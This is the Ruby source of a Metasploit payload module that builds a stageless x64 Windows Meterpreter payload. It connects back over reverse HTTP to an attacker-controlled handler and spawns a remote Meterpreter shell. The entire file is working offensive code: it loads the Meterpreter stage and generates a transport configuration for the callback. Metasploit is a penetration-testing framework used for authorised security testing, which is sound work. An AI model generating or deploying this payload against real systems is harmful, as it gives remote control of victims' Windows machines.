##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/handler/reverse_http'
require 'msf/core/payload/windows/x64/meterpreter_loader'
require 'msf/base/sessions/meterpreter_x64_win'
require 'msf/base/sessions/meterpreter_options'
require 'rex/payloads/meterpreter/config'

module Metasploit4

  CachedSize = 1105478

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Payload::Windows::MeterpreterLoader_x64
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Windows Meterpreter Shell, Reverse HTTP Inline (x64)',
      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
      'Author'      => [ 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Session'     => Msf::Sessions::Meterpreter_x64_Win
      ))

    register_options([
      OptString.new('EXTENSIONS', [false, "Comma-separate list of extensions to load"]),
    ], self.class)
  end

  def generate
    stage_meterpreter(true) + generate_config
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid
    opts[:stageless] = true

    # create the configuration block
    config_opts = {
      arch:       opts[:uuid].arch,
      exitfunk:   datastore['EXITFUNC'],
      expiration: datastore['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: [transport_config_reverse_http(opts)],
      extensions: (datastore['EXTENSIONS'] || '').split(',')
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end

end
